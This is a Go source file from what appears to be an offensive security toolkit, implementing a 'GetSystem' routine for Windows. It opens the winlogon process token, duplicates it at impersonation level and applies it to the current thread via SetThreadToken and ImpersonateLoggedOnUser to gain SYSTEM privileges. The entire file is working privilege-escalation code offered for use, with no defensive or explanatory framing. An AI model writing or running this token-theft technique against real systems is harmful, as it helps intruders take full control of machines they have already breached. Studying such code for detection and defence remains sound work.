package main

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"github.com/redt1de/gubeus/process"
	"golang.org/x/sys/windows"
)

var (
	advapi                  = syscall.NewLazyDLL("advapi32.dll")
	duplicateToken          = advapi.NewProc("DuplicateToken")
	impersonateLoggedOnUser = advapi.NewProc("ImpersonateLoggedOnUser")
)

func GetSystem() {
	// ensure all available privs are enabled
	fmt.Println("[!] Attempting to GetSystem...")

	// find winlogon process
	winlog, err := process.GetProcessByNameWin("winlogon")
	if err != nil {
		log.Fatal("[ERROR] failed to get handle to winlogon:", err)
	}

	// get the process token for winlogon
	var wToken windows.Token
	defer wToken.Close()

	err = windows.OpenProcessToken(*winlog, windows.TOKEN_DUPLICATE, &wToken)
	if err != nil {
		log.Fatal("[ERROR] OpenProcessToken failed:", err)
	}
	var sysToken windows.Token
	defer sysToken.Close()
	err = DuplicateToken(wToken, 2, &sysToken) // 2 == SecurityImpersonation
	if err != nil {
		log.Fatal("[ERROR] DuplicateToken failed:", err)
	}

	sysTokenUser, _ := sysToken.GetTokenUser()
	fmt.Println("[+] Duplicated sysToken User:", sysTokenUser.User.Sid)

	thr := windows.CurrentThread()
	windows.SetThreadToken(&thr, sysToken)
	windows.ResumeThread(thr)

	// impersonateUser(syscall.Handle(sysToken))
	err = ImpersonateLoggedOnUser(sysToken)
	if err != nil {
		log.Fatal("[ERROR] ImpersonateLoggedOnUser failed:", err)
	}

}

// BOOL DuplicateToken(
//
//		[in]  HANDLE                       ExistingTokenHandle,
//		[in]  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
//		[out] PHANDLE                      DuplicateTokenHandle
//	  );
func DuplicateToken(existingToken windows.Token, impersonationLevel uint32, newToken *windows.Token) error {
	ok, _, _ := duplicateToken.Call(uintptr(existingToken), uintptr(impersonationLevel), uintptr(unsafe.Pointer(newToken)))
	if ok != 1 {
		return syscall.GetLastError()
	}
	return nil
}

// [DllImport("advapi32.dll", SetLastError = true)]
// public static extern bool ImpersonateLoggedOnUser(
// 	IntPtr hToken);

func ImpersonateLoggedOnUser(token windows.Token) error {
	ok, _, _ := impersonateLoggedOnUser.Call(uintptr(token))
	if ok != 1 {
		return syscall.GetLastError()
	}
	return nil
}
